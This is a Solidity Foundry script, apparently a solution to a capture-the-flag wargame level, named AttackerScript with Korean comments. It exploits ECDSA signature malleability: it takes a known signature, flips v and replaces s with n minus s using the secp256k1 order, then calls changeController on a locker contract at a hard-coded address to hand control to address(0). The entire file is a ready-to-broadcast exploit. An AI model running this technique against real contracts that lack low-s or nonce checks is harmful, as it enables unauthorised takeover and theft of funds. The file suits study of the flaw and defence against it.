// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

interface IImpersonator {
    function lockers(uint256) external view returns (IECLocker);
}
interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}
contract AttackerScript is Script {

    IImpersonator target;
    IECLocker locker;

    function setUp() public {
        target = IImpersonator(0xa773bc15287acA03C3A844Ec3B59d04dD6D50Fc7); // Instance 주소
        locker = target.lockers(0);
    }

    function run() public {
        vm.startBroadcast();

        uint8 v = 27;
        bytes32 r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
        bytes32 s = bytes32(uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706));
        bytes32 n = bytes32(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);

        // (v, r, s) => (v', r, n - s) 변환
        uint8 _v;
        if (v == 27)
            _v = 28;
        else
            _v = 27;
        bytes32 n_s = bytes32(uint256(n) - uint256(s));

        locker.changeController(_v, r, n_s, address(0));

        vm.stopBroadcast();
    }
}
